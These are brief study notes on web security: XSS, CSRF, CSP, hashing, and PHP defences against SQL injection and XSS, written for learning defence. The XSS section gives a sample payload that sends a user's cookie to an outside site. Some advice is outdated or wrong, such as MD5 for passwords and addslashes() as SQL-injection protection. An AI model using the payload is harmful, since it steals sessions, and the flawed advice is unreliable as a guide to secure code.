# 安全原则
1. data confidentiality: 数据保密
2. data integrity: 数据完整
3. System availability: 系统可用

# XSS (Cross site scripting) 跨站脚本攻击
## 是什么
- 攻击者利用 XSS 漏洞向网站中传入恶意代码，用户访问时，代码会自动执行

```js
//在 A 网站注入下面代码，B 网站会拿到用户在 A 网站的 cookie
<script>window.open("www.b.com?param="+document.cookie)</script>
```

## 怎么办
- 服务端渲染出来的时候，要对 html 进行 encode

# CSRF (Cross-site request forgery) 跨站请求伪造
## 是什么
- 用户登陆 A 网站 ，浏览器有 A 的 cookie，然后登陆 B 网站，B 网站可以诱导用户向 A 网站提交请求，因为已经有了 A 的 cookie，所以请求会被接受

## 怎么办
1. http 请求的 header 里面有一个 referer，里面保存请求的源地址，通过验证源地址来判断
2. 可以在网站表单中加入一个随机的 token，通过验证 token 来判断

# CSP (Content Security Policy)
## 是什么

## 怎么用
- http 头部的 ` Content-Security-Policy `
- mata tag
 


# Hash (散列)
- like a finger print
- 一组输入，通过**散列函数**，得到一组固定长度的输出，
- 输入不同，输出也不同，
- 是一种从任何一种数据中创建小的数字“指纹”的方法
- 可以用来加密存储在数据库的密码
- 常用函数MD5

# PHP prevent SQL injection
1. use place holder in the query 
    - `select * from table where id=?`
    - all the input are seen as one, so it's safe
2. add_slashes() and add quote in the parameter
    - `select * from table where id='{$_GET['id']}'`
    - quote is needed because if someone want to inject, they must close the single quote, 
    but with the add_slashes(), they can not close the single quote so it's safe.
    
# Prevent XSS for PHP
1. clean input
    - addslashes()
2. clean output
    - htmlspecialchar()


# Ref
- [https://segmentfault.com/a/1190000007932293](https://segmentfault.com/a/1190000007932293)
- [http://www.ruanyifeng.com/blog/2016/09/csp.html](http://www.ruanyifeng.com/blog/2016/09/csp.html)